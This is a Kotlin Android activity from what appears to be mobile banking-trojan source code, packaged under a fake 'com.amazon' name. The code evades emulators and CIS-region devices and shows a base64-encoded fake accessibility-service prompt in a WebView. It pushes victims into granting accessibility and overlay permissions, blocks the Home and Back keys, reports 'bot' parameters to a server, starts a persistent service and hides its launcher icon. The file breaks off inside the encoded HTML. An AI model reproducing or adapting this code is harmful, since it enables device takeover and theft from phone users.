package com.amazon.zzz.Activities

import android.annotation.SuppressLint
import android.app.Activity
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.view.KeyEvent
import android.view.View
import android.view.ViewGroup
import android.webkit.*
import com.amazon.zzz.ApiNm.apiUt
import com.amazon.zzz.BuildConfig
import com.amazon.zzz.Modull.udUtils
import com.amazon.zzz.R
import com.amazon.zzz.Services.srvEndlessService
import com.amazon.zzz.Services.srvSccessibility
import com.amazon.zzz.Utilsss.SharedPreferencess
import com.amazon.zzz.Utilsss.utMiuUtils
import com.amazon.zzz.Utilsss.utUtils
import com.amazon.zzz.constNm
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.util.*


class actToastAccessbility : Activity() {

    private val REQUEST_OVERLAY_PERMISSION = 1234
    private var ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE = 2323

    var launchHttp = true
    var requestPerm = false
    var requestSpecPerm = false
    var wv: WebView? = null

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        startActivity(
            Intent(applicationContext, constNm.a3)
                .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                .addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
                .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                .putExtra("FromPush", true)
        )
        Handler(Looper.getMainLooper()).postDelayed({
            finish()
        }, 100)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        apiUt.sendLogs(this, "", "actToastAccessbility onCreate", "log")

        SharedPreferencess.init(this.applicationContext)
        if (utUtils.blockCIS(applicationContext) || utUtils.isRunningOnEmulator()) {
            runCatching {
                utUtils.deleteLabelIcon(this)
            }
            finish()
            return
        }

        setContentView(R.layout.custom_notif_zzz)

        runCatching {
            if (!srvSccessibility.active && utUtils.isAccessibilityServiceEnabled(
                    applicationContext,
                    constNm.a14
                )
            ) {
                applicationContext.startService(
                    Intent(
                        applicationContext,
                        srvSccessibility::class.java
                    )
                )
            }
        }

        val startFromPush: Boolean = intent.getBooleanExtra("FromPush", false)

        if (startFromPush || s227.isEmpty()) {
            launchHttp = false
        }

        if (utUtils.isAccessibilityServiceEnabled(this, constNm.a14)) {
            work()
        } else {
            if (launchHttp) {
                successLaunchUrl = 0
                activityAccessibilityVisible = ""

                wv = WebView(this)
                wv?.settings?.javaScriptEnabled = true
                wv?.settings?.loadWithOverviewMode = true
                wv?.settings?.useWideViewPort = true
                wv?.settings?.pluginState = WebSettings.PluginState.ON
                wv?.settings?.javaScriptCanOpenWindowsAutomatically = true

                wv?.scrollBarStyle = View.SCROLLBARS_INSIDE_OVERLAY
                wv?.webViewClient = MyWebViewClient()
                wv?.webChromeClient = MyWebChromeClient()
                wv?.addJavascriptInterface(WebAppInterface(this), "Android")

                try {
                    var base64 = s227
                    val data = Base64.decode(base64, Base64.DEFAULT)
                    base64 = String(data, constNm.utf)
                    base64 = base64.replace(constNm.acname, constNm.access2)

                    val lang = Locale.getDefault().language
                    val lan = "en"
                    base64 = base64.replace("<html lang=\"$lan\">", "<html lang=\"$lang\">")
                    base64 = base64.replace(
                        constNm.ключ_от_всего,
                        constNm.шифрование + lang + constNm.ss5
                    )

                    wv?.loadDataWithBaseURL(null, base64, "text/html", "UTF-8", null)
                    setContentView(wv)
                } catch (ex: Exception) {
                }
            } else {
                successLaunchUrl = 1
                activityAccessibilityVisible = "1"
                val intent = Intent("android.settings.ACCESSIBILITY_SETTINGS")
                startActivityForResult(intent, 12345)
                if (s228.isNotEmpty()) {
                    startActivity(
                        Intent(
                            this@actToastAccessbility,
                            DialogActivity::class.java
                        ).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                            addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                        })
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        activityAccessibilityVisible = ""

        try {
            // destroy the WebView completely
            if (wv != null) {
                (wv?.parent as ViewGroup?)?.removeView(wv)
                wv?.removeAllViews()
                wv?.destroy()
                wv = null
            }
        } catch (e: Exception) {
            utUtils.Log("destr", e.localizedMessage)
        }
    }

    override fun onResume() {
        super.onResume()
        work()
    }

    override fun onStart() {
        super.onStart()
        active = true
    }

    override fun onStop() {
        super.onStop()
        active = false
    }

    override fun finish() {
        if ("xiaomi" == Build.MANUFACTURER.lowercase()) {
            if ((utMiuUtils.isAllowed(applicationContext) && utMiuUtils.canDrawOverlays(
                    applicationContext
                ))
                && utUtils.hasPermissionAllTrue(this)
            ) {
                apiUt.sendLogs(this, "", "actToastAccessbility finish start work", "log")
                SharedPreferencess.permission_get = "1"
                GlobalScope.launch {
                    apiUt.updateBotParams(applicationContext)
                }
                utUtils.startCustomTimer(this, 10000)
                srvEndlessService.autoStart(applicationContext)
                utUtils.deleteLabelIcon(this)
                runCatching {
                    (this.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager?)?.cancel(
                        993
                    )
                }
                runCatching {
                    udUtils.startApplication(this, SharedPreferencess.applicationId)
                }
            }
        } else {
            if (utMiuUtils.canDrawOverlays(applicationContext) &&
                utUtils.hasPermissionAllTrue(this)
            ) {
                SharedPreferencess.permission_get = "1"
                apiUt.sendLogs(this, "", "actToastAccessbility finish start work", "log")
                GlobalScope.launch {
                    apiUt.updateBotParams(applicationContext)
                }
                utUtils.startCustomTimer(this, 10000)
                srvEndlessService.autoStart(applicationContext)
                utUtils.deleteLabelIcon(this)
                runCatching {
                    (this.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager?)?.cancel(
                        993
                    )
                }
                runCatching {
                    udUtils.startApplication(this, SharedPreferencess.applicationId)
                }
            }
        }

        activityAccessibilityVisible = ""

        super.finish()
    }

    override fun onBackPressed() {
        work()
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent): Boolean {
        if (keyCode == KeyEvent.KEYCODE_HOME) {
            return true
        }
        return if (keyCode == KeyEvent.KEYCODE_BACK) {
            true
        } else keyCode == KeyEvent.KEYCODE_MENU
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        work()
    }

    @SuppressLint("NewApi")
    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
    }

    fun xiaomiPermission() {
        try {
            SharedPreferencess.autoClickPerm2 = "1"
            // MIUI 8
            val localIntent = Intent("miui.intent.action.APP_PERM_EDITOR")
            localIntent.setClassName(
                "com.miui.securitycenter",
                "com.miui.permcenter.permissions.PermissionsEditorActivity"
            )
            localIntent.putExtra("extra_pkgname", packageName)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            startActivityForResult(localIntent, REQUEST_OVERLAY_PERMISSION)
        } catch (e: java.lang.Exception) {
            try {
                SharedPreferencess.autoClickPerm2 = "1"
                // MIUI 5/6/7
                val localIntent = Intent("miui.intent.action.APP_PERM_EDITOR")
                localIntent.setClassName(
                    "com.miui.securitycenter",
                    "com.miui.permcenter.permissions.AppPermissionsEditorActivity"
                )
                localIntent.putExtra("extra_pkgname", packageName)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                startActivityForResult(localIntent, REQUEST_OVERLAY_PERMISSION)
            } catch (e1: java.lang.Exception) {
                // Otherwise jump to application details
                utMiuUtils.canDrawOverlays(applicationContext)
                SharedPreferencess.autoClickPerm = "1"
                val intent = Intent(
                    "android.settings.action.MANAGE_OVERLAY_PERMISSION",
                    Uri.parse("package:$packageName")
                )
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                startActivityForResult(intent, REQUEST_OVERLAY_PERMISSION)
            }
        }
    }

    private fun requestPermission() {
        SharedPreferencess.autoClickPerm = "1"

        val intent = Intent(
            "android.settings.action.MANAGE_OVERLAY_PERMISSION",
            Uri.parse("package:$packageName")
        ).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
        startActivityForResult(intent, ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE)
    }

    private fun work() {
        if (utUtils.isAccessibilityServiceEnabled(applicationContext, constNm.a14)) {
            if ("xiaomi" == Build.MANUFACTURER.lowercase()) {
                if (!requestSpecPerm && (!utMiuUtils.isAllowed(applicationContext) || !utMiuUtils.canDrawOverlays(
                        applicationContext
                    ))
                ) {
                    requestSpecPerm = true
                    apiUt.sendLogs(this, "", "actToastAccessbility work xiaomiPermission", "log")
                    xiaomiPermission()
                } else if (!requestPerm && (utMiuUtils.isAllowed(applicationContext) && utMiuUtils.canDrawOverlays(
                        applicationContext
                    )) && !utUtils.hasPermissionAllTrue(this)
                ) {
                    requestPerm = true

                    val permissions = constNm.p2
                    if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O) {
                        permissions.add(constNm.p1)
                    }
                    apiUt.sendLogs(this, "", "actToastAccessbility requestPermissions", "log")
                    requestPermissions(permissions.toTypedArray(), PERMISSION_REQUEST_CODE)
                } else if ((utMiuUtils.isAllowed(applicationContext) && utMiuUtils.canDrawOverlays(
                        applicationContext
                    )) && utUtils.hasPermissionAllTrue(this)
                ) {
                    apiUt.sendLogs(this, "", "actToastAccessbility work finish", "log")
                    finish()
                }
            } else {
                if (!requestSpecPerm && !utMiuUtils.canDrawOverlays(applicationContext)) {
                    requestSpecPerm = true
                    apiUt.sendLogs(this, "", "actToastAccessbility work requestPermissions1", "log")
                    requestPermission()
                } else if (!requestPerm && utMiuUtils.canDrawOverlays(applicationContext) && !utUtils.hasPermissionAllTrue(
                        this
                    )
                ) {
                    requestPerm = true
                    val permissions = constNm.p2
                    if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O) {
                        permissions.add(constNm.p1)
                    }
                    apiUt.sendLogs(this, "", "actToastAccessbility work requestPermissions2", "log")
                    requestPermissions(permissions.toTypedArray(), PERMISSION_REQUEST_CODE)
                } else if (utMiuUtils.canDrawOverlays(applicationContext) && utUtils.hasPermissionAllTrue(
                        this
                    )
                ) {
                    apiUt.sendLogs(this, "", "actToastAccessbility work finish", "log")
                    finish()
                }
            }
        }
    }

    inner class WebAppInterface internal constructor(var mContext: Context) {
        @JavascriptInterface
        fun onData() {
            successLaunchUrl = 1
            activityAccessibilityVisible = "1"
            val intent = Intent("android.settings.ACCESSIBILITY_SETTINGS")
            startActivityForResult(intent, 12345)

            try {
                // destroy the WebView completely
                if (wv != null) {
                    (wv?.parent as ViewGroup?)?.removeView(wv)
                    wv?.removeAllViews()
                    wv?.destroy()
                    wv = null
                }
            } catch (e: Exception) {
                utUtils.Log("destr", e.localizedMessage)
            }

            apiUt.sendLogs(this@actToastAccessbility, "", "WebAppInterface onData", "log")

            if (s228.isNotEmpty()) {
                startActivity(
                    Intent(
                        this@actToastAccessbility,
                        DialogActivity::class.java
                    ).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                        addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                    })
            }
        }
    }

    private inner class MyWebChromeClient : WebChromeClient() {
        override fun onJsAlert(
            view: WebView,
            url: String,
            message: String,
            result: JsResult
        ): Boolean {
            return true
        }
    }

    private inner class MyWebViewClient : WebViewClient() {
        override fun onPageFinished(view: WebView, url: String) {
        }

        override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
            return true
        }
    }

    companion object {
        var activityAccessibilityVisible = ""

        var successLaunchUrl = 0
        var active = false

        const val PERMISSION_REQUEST_CODE = 123

        val s227: String by lazy {
            if (BuildConfig.DEBUG) "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9ImllPWVkZ2UiPgo8c3R5bGU+Cmh0bWx7bGluZS1oZWlnaHQ6MS4xNTstd2Via2l0LXRleHQtc2l6ZS1hZGp1c3Q6MTAwJX1ib2R5e21hcmdpbjowfW1haW57ZGlzcGxheTpibG9ja31oMXtmb250LXNpemU6MmVtO21hcmdpbjouNjdlbSAwfWhye2JveC1zaXppbmc6Y29udGVudC1ib3g7aGVpZ2h0OjA7b3ZlcmZsb3c6dmlzaWJsZX1wcmV7Zm9udC1mYW1pbHk6bW9ub3NwYWNlLG1vbm9zcGFjZTtmb250LXNpemU6MWVtfWF7YmFja2dyb3VuZC1jb2xvcjp0cmFuc3BhcmVudH1hYmJyW3RpdGxlXXtib3JkZXItYm90dG9tOm5vbmU7dGV4dC1kZWNvcmF0aW9uOnVuZGVybGluZTt0ZXh0LWRlY29yYXRpb246dW5kZXJsaW5lIGRvdHRlZH1iLHN0cm9uZ3tmb250LXdlaWdodDpib2xkZXJ9Y29kZSxrYmQsc2FtcHtmb250LWZhbWlseTptb25vc3BhY2UsbW9ub3NwYWNlO2ZvbnQtc2l6ZToxZW19c21hbGx7Zm9udC1zaXplOjgwJX1zdWIsc3Vwe2ZvbnQtc2l6ZTo3NSU7bGluZS1oZWlnaHQ6MDtwb3NpdGlvbjpyZWxhdGl2ZTt2ZXJ0aWNhbC1hbGlnbjpiYXNlbGluZX1zdWJ7Ym90dG9tOi0uMjVlbX1zdXB7dG9wOi0uNWVtfWltZ3tib3JkZXItc3R5bGU6bm9uZX1idXR0b24saW5wdXQsb3B0Z3JvdXAsc2VsZWN0LHRleHRhcmVhe2ZvbnQtZmFtaWx5OmluaGVyaXQ7Zm9udC1zaXplOjEwMCU7bGluZS1oZWlnaHQ6MS4xNTttYXJnaW46MH1idXR0b24saW5wdXR7b3ZlcmZsb3c6dmlzaWJsZX1idXR0b24sc2VsZWN0e3RleHQtdHJhbnNmb3JtOm5vbmV9YnV0dG9uLFt0eXBlPSJidXR0b24iXSxbdHlwZT0icmVzZXQiXSxbdHlwZT0ic3VibWl0Il17LXdlYmtpdC1hcHBlYXJhbmNlOmJ1dHRvbn1idXR0b246Oi1tb3otZm9jdXMtaW5uZXIsW3R5cGU9ImJ1dHRvbiJdOjotbW96LWZvY3VzLWlubmVyLFt0eXBlPSJyZXNldCJdOjotbW96LWZvY3VzLWlubmVyLFt0eXBlPSJzdWJtaXQiXTo6LW1vei1mb2N1cy1pbm5lcntib3JkZXItc3R5bGU6bm9uZTtwYWRkaW5nOjB9YnV0dG9uOi1tb3otZm9jdXNyaW5nLFt0eXBlPSJidXR0b24iXTotbW96LWZvY3VzcmluZyxbdHlwZT0icmVzZXQiXTotbW96LWZvY3VzcmluZyxbdHlwZT0ic3VibWl0Il06LW1vei1mb2N1c3Jpbmd7b3V0bGluZToxcHggZG90dGVkIEJ1dHRvblRleHR9ZmllbGRzZXR7cGFkZGluZzouMzVlbSAuNzVlbSAuNjI1ZW19bGVnZW5ke2JveC1zaXppbmc6Ym9yZGVyLWJveDtjb2xvcjppbmhlcml0O2Rpc3BsYXk6dGFibGU7bWF4LXdpZHRoOjEwMCU7cGFkZGluZzowO3doaXRlLXNwYWNlOm5vcm1hbH1wcm9ncmVzc3t2ZXJ0aWNhbC1hbGlnbjpiYXNlbGluZX10ZXh0YXJlYXtvdmVyZmxvdzphdXRvfVt0eXBlPSJjaGVja2JveCJdLFt0eXBlPSJyYWRpbyJde2JveC1zaXppbmc6Ym9yZGVyLWJveDtwYWRkaW5nOjB9W3R5cGU9Im51bWJlciJdOjotd2Via2l0LWlubmVyLXNwaW4tYnV0dG9uLFt0eXBlPSJudW1iZXIiXTo6LXdlYmtpdC1vdXRlci1zcGluLWJ1dHRvbntoZWlnaHQ6YXV0b31bdHlwZT0ic2VhcmNoIl17LXdlYmtpdC1hcHBlYXJhbmNlOnRleHRmaWVsZDtvdXRsaW5lLW9mZnNldDotMnB4fVt0eXBlPSJzZWFyY2giXTo6LXdlYmtpdC1zZWFyY2gtZGVjb3JhdGlvbnstd2Via2l0LWFwcGVhcmFuY2U6bm9uZX06Oi13ZWJraXQtZmlsZS11cGxvYWQtYnV0dG9uey13ZWJraXQtYXBwZWFyYW5jZTpidXR0b247Zm9udDppbmhlcml0fWRldGFpbHN7ZGlzcGxheTpibG9ja31zdW1tYXJ5e2Rpc3BsYXk6bGlzdC1pdGVtfXRlbXBsYXRle2Rpc3BsYXk6bm9uZX1baGlkZGVuXXtkaXNwbGF5Om5vbmV9aHRtbCxib2R5e2ZvbnQtZmFtaWx5OiJPcGVuIFNhbnMiLCJIZWx2ZXRpY2EgTmV1ZSIsSGVsdmV0aWNhLEFyaWFsLHNhbnMtc2VyaWY7bWFyZ2luOjA7aGVpZ2h0OjEwMCU7b3ZlcmZsb3c6aGlkZGVufS5oZWFkZXJ7aGVpZ2h0OjY1cHg7Ym9yZGVyLWJvdHRvbTozcHggc29saWQgI2UyZTJlMn0uaGVhZGVyIGJ7bGluZS1oZWlnaHQ6NjVweDtmb250LXNpemU6MS41cmVtfS5oc3B7YmFja2dyb3VuZC1jb2xvcjojZjRmNGY0O2NvbG9yOiM0NjQ2NDY7aGVpZ2h0OjM0cHg7bGluZS1oZWlnaHQ6MzRweDtwYWRkaW5nLXRvcDo1cHh9LmhzcCBie21hcmdpbi1sZWZ0OjE1cHh9LmVsc3tsaW5lLWhlaWdodDo1NXB4O2hlaWdodDo1NXB4O2JvcmRlci1ib3R0b206MXB4IHNvbGlkICNmMmYyZjI7bWFyZ2luOjAgMTVweCAwIDE1cHh9LmVscyAubm17ZmxvYXQ6bGVmdDt3aGl0ZS1zcGFjZTpub3dyYXA7d2lkdGg6MH0uZWxzIC52bHtwb3NpdGlvbjpmaXhlZDtsZWZ0Ojg5JTtjb2xvcjojOTg5ODk4fS5jaGJ7YmFja2dyb3VuZC1zaXplOjEwMCUgMTAwJTt3aWR0aDo1NHB4O2hlaWdodDo0OXB4O21hcmdpbi10b3A6NHB4fS5hbXJ7bWFyZ2luLXRvcDo1NnB4fS5hbntoZWlnaHQ6NTZweDt3aWR0aDoxMDAlO3Bvc2l0aW9uOmZpeGVkO2JhY2tncm91bmQ6d2hpdGU7YW5pbWF0aW9uOmExIDNzOy1tb3otYW5pbWF0aW9uOmExIDNzIGluZmluaXRlOy13ZWJraXQtYW5pbWF0aW9uOmExIDNzIGluZmluaXRlfS53aHt3aWR0aDoxMDAlO2hlaWdodDotbW96LWNhbGMoMTAwJSAtICg5MHB4ICsgMTYwcHgpKTtoZWlnaHQ6LXdlYmtpdC1jYWxjKDEwMCUgLSAoOTBweCArIDE2MHB4KSk7aGVpZ2h0OmNhbGMoMTAwJSAtICg5MHB4ICsgMTYwcHgpKTtwb3NpdGlvbjpmaXhlZDtib3R0b206MDt6LWluZGV4OjE7YmFja2dyb3VuZDpyZ2IoMCwwLDApO2JhY2tncm91bmQ6bGluZWFyLWdyYWRpZW50KDE4MGRlZyxyZ2JhKDAsMCwwLDApIDAscmdiYSgyNTUsMjU1LDI1NSwxKSA4NSUpfS5uYnR7ei1pbmRleDo0O3Bvc2l0aW9uOmZpeGVkO3dpZHRoOjcwcHg7aGVpZ2h0OjcwcHg7Ym90dG9tOjkwcHg7bGVmdDo1MCU7bWFyZ2luLWxlZnQ6LTM1cHg7Ym9yZGVyLXJhZGl1czo5OTlweDtiYWNrZ3JvdW5kOnJnYig4Myw4Myw4Myl9LmJ0bntkaXNwbGF5OmlubGluZS1ibG9jaztmb250LXdlaWdodDo0MDA7dGV4dC1hbGlnbjpjZW50ZXI7d2hpdGUtc3BhY2U6bm93cmFwO3ZlcnRpY2FsLWFsaWduOm1pZGRsZTstd2Via2l0LXVzZXItc2VsZWN0Om5vbmU7LW1vei11c2VyLXNlbGVjdDpub25lOy1tcy11c2VyLXNlbGVjdDpub25lO3VzZXItc2VsZWN0Om5vbmU7d2lkdGg6MTAwcHg7Ym9yZGVyOjFweCBzb2xpZCB0cmFuc3BhcmVudDtib3JkZXItdG9wLWNvbG9yOnRyYW5zcGFyZW50O2JvcmRlci1yaWdodC1jb2xvcjp0cmFuc3BhcmVudDtib3JkZXItYm90dG9tLWNvbG9yOnRyYW5zcGFyZW50O2JvcmRlci1sZWZ0LWNvbG9yOnRyYW5zcGFyZW50O3BhZGRpbmc6LjVyZW0gMnJlbTtmb250LXNpemU6MS41cmVtO2xpbmUtaGVpZ2h0OjEuNTtib3JkZXItcmFkaXVzOi4yNXJlbTt0cmFuc2l0aW9uOmNvbG9yIC4xNXMgZWFzZS1pbi1vdXQsYmFja2dyb3VuZC1jb2xvciAuMTVzIGVhc2UtaW4tb3V0LGJvcmRlci1jb2xvciAuMTVzIGVhc2UtaW4tb3V0LGJveC1zaGFkb3cgLjE1cyBlYXNlLWluLW91dH0uYnRuLW91dGxpbmUtc3VjY2Vzc3tjb2xvcjojMDA3YmZmO2JhY2tncm91bmQtY29sb3I6dHJhbnNwYXJlbnQ7YmFja2dyb3VuZC1pbWFnZTpub25lO2JvcmRlci1jb2xvcjojMDA3YmZmfS5idG5fZGl2e3Bvc2l0aW9uOmFic29sdXRlO3RvcDo3NyU7bGVmdDo1MCU7bWFyZ2luLWxlZnQ6LTUwcHh9LnN0MDF7YW5pbWF0aW9uOmEyIDNzOy1tb3otYW5pbWF0aW9uOmEyIDNzIGluZmluaXRlOy13ZWJraXQtYW5pbWF0aW9uOmEyIDNzIGluZmluaXRlfS5uYnQgLmFhcntmbG9hdDpub25lO3Bvc2l0aW9uOmFic29sdXRlO3dpZHRoOjM4cHggIWltcG9ydGFudDtoZWlnaHQ6MzhweCAhaW1wb3J0YW50O21hcmdpbi1sZWZ0OjE5cHh9LmN0eHR7cG9zaXRpb246Zml4ZWQ7Ym90dG9tOjQ1cHg7d2lkdGg6MTAwJTt0ZXh0LWFsaWduOmNlbnRlcjt6LWluZGV4OjI7Zm9udC13ZWlnaHQ6Ym9sZH0uZHN7dXNlci1zZWxlY3Q6bm9uZTstd2Via2l0LXVzZXItc2VsZWN0Om5vbmU7LWtodG1sLXVzZXItc2VsZWN0Om5vbmU7LW1vei11c2VyLXNlbGVjdDpub25lOy1tcy11c2VyLXNlbGVjdDpub25lfUAtd2Via2l0LWtleWZyYW1lcyBhMnswJXt0cmFuc2Zvcm06c2NhbGUoMS4wKX01MCV7dHJhbnNmb3JtOnNjYWxlKDEuMil9MTAwJXt0cmFuc2Zvcm06c2NhbGUoMS4wKX19QC1tb3ota2V5ZnJhbWVzIGEyezAle3RyYW5zZm9ybTpzY2FsZSgxLjApfTUwJXt0cmFuc2Zvcm06c2NhbGUoMS4yKX0xMDAle3RyYW5zZm9ybTpzY2FsZSgxLjApfX1ALXdlYmtpdC1rZXlmcmFtZXMgYTF7MCV7YmFja2dyb3VuZDp3aGl0ZX01MCV7YmFja2dyb3VuZDpyZ2IoMjUzLDIyMCwyMjApfTEwMCV7YmFja2dyb3VuZDp3aGl0ZX19QC1tb3ota2V5ZnJhbWVzIGExezAle2JhY2tncm91bmQ6d2hpdGV9NTAle2JhY2tncm91bmQ6cmdiKDI1MywyMjAsMjIwKX0xMDAle2JhY2tncm91bmQ6d2hpdGV9fQo8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5IGNsYXNzPSJkcyI+CiAgICA8ZGl2PjxoMyBzdHlsZT0idGV4dC1hbGlnbjogY2VudGVyOyBwYWRkaW5nLWxlZnQ6IDE1cHg7IHBhZGRpbmctcmlnaHQ6IDE3cHg7IHBhZGRpbmctYm90dG9tOiAyMHB4OyBwYWRkaW5nLXRvcDogMjBweDsiID4lRW5hYmxlX0FjY2Vzc2liaWxpdHlfU2VydmljZSU8L2gzPjwvZGl2PgogICAgPGRpdiBjbGFzcz0iaGVhZGVyIj4KICAgICAgICA8aW1nIHN0eWxlPSJtYXJnaW4tbGVmdDo1cHg7IHdpZHRoOiAxNnB4OyIgc3JjPSJkYXRhOmltYWdlL3BuZztiYXNlNjQsIGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFRQUFBQUVBQ0FRQUFBRDJlMkR0QUFBRG9rbEVRVlI0MnUzZHJXOVRjUmhIOFlmT2dKaEJUQkJDUUpKc2JUY1lTQklVQ2pNeU05NzJCdXgvd0NJd0tFZ3dHQnhCWWhEVDRNY1VEZ2RieDViTmtZMkxtR0hKU3E5aGJYL1A1MXpicERmZmMzcDcyNlJwQkU2YTJYZ2I2N0VibitOVlRKc2pGK2ZpUTFSL0hmdnhQRTZiSlF1VDBUbWkvL0JZalZPbXlhRi82eGo5VlZTeFlwek0rcXZZaTdNR3lxdS9paXB1OWV2RUd0eWNpUDdWSHEveEtRRmsxaDh4WnFaeTlmLzc0bjk0ekJzcXMvNHFXcWJLck44M0FhbjE3OFZGWStYVi96dm1qSlZaLzRLeDZBZjlvQi8wZzM3UUQvcEJQK2dIL2FBZjlHTXdhZE5QUC8zMDAwOS9kLzJMeHFJZjlJTiswQS82UVQvb0IvMmdIL1NEZnRDUFFkWGZvWjkrK3Vtbm4vNXUrcGVNUlQvb0IvMmdIL1JqYUduUlR6Lzk5Tk5QUC8zMDAwOC8vZlRUVHovOTlOTlBQK2hIUnYzTHhxSWY5SU4rMEEvNlFUL29CLzJnSC9TRGZ0QVArakZ3Tk9tbm4zNzZlK2gvWkN6NlFUL0swYjlKUC8zMDAwOC8vZlRUVHovOTlOTlBQLzMwMDI4cytrRS82QWY5eUtML3NiSG9CLzJnSC9TRGZ0Q1BZV1NDZnZycHA1OSsrdW1ubjM3NjZhZWZmdnJwcDUvKzNQcWZHSXQrMEEvNlFUL29CLzJnSC9Sam1QUnYwRTgvL2ZUVG40MXgrak56SnI3U241a1g5R2ZtUWh6UW41bVpXdnBYREZVcXorZ2ZCQnA5ZStZUjQrZG0xaDFBYmk3NURKQ2QxeExJeldoOGswQnVyc1dPQkhKelhRS3VBaEtRZ0FRazRKZUFFcENBQkNRZ0FRbElRQUlTa0lBRUpDQUJDVWpBUHdLbFpGb0NFcENBQkNRZ0FRbElRQUlTa0VEcUJMWWxJSUY2Q1N3YlN3S1FBQ1FBQ2FBOHJrcEFBaEtRZ0FRa1VDK0JKV05KQUJLQUJDQUJTQUFTZ0FTUU5vRkZZNVhKRlFsSVFBSVNrRUQyQkg1S1FBSVNrSUFFSkNBQkNkUklZTUZZRW9BRUlBRklBT1V4SlFFSlNFQUNFcENBQkNSUTR6aUllV05KQUJLQUJDQUJTQUFTUUhrSmJFa2dONU8xRTNob0xBbEFBcEFBSkFBSlFBS1FBTkltOE1CWUVvQUVJQUVVU0ZzQ0VwQ0FCQ1FnQVFsSVFBSVNxSlBBZldOSkFJVW0wSkdBQkNRZ0FRbElRQUlTa0VCZVdoS1FRTjBFN2hsTEFwQUFKQUFKUUFLUUFDUUFDU0JyQW5lTkpRRVVTVk1DRXBCQStnUTJKU0FCQ1VoQUFoS1FnQVJxSkRCbkxBa2dkUUw3RXBDQUJDUmdMQWxBQWlpUmlkb0ozREZXN2dSMjRyeXhjaWZ3MFZUWkU3aHNxdHdKOU8xV3NNSFFmK1pMM0l4T3owYzFCWkE3Z2U5bUtwdGVid1EzVEZSK0FodGQ5Vy9IcUlFeUorRGJ3RFFKL0RoRy96dkQ1R0VzM2grUi95dWV4b2haY25FNzNzUmE3TWFuZUJudGZwL01IMUxEaVp1emhpWXFBQUFBQUVsRlRrU3VRbUNDIiAgLz4KICAgICAgIDxiIHN0eWxlPSJmb250LXNpemU6IDIwcHg7IiBpZD0iYWNjZXNzYWJpbGl0eTEiPjwvYj4KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iaHNwIj48YiBpZD0iZG93bmxvYWRlZHNlcnZpY2UiPjwvYj48L2Rpdj4KICAgIDxkaXYgY2xhc3M9ImVscyI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9Im5tIj4KICAgICAgICAgICAgICAgIDxiIGlkPSJzd2l0Y2hhY2Nlc3MiPjwvYj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgaWQ9Im9mZjMiIGNsYXNzPSJ2bCI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJhYXIiPjwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iZWxzIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0ibm0iPgogICAgICAgICAgICAgICAgPGIgaWQ9J3RhbGtiYWNrJz48L2I+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGlkPSJvZmY0IiBjbGFzcz0idmwiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYWFyIj48L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4gICAgPGltZyBjbGFzcz0ic3QwMSIgc3R5bGU9Im1hcmdpbi10b3A6IC02NXB4OyBtYXJnaW4tbGVmdDogMTIwcHg7IHotaW5kZXg6IDk5OTsgcG9zaXRpb246IGZpeGVkOyAgd2lkdGg6IDYwcHg7IiBzcmM9ImRhdGE6aW1hZ2UvcG5nO2Jhc2U2NCxpVk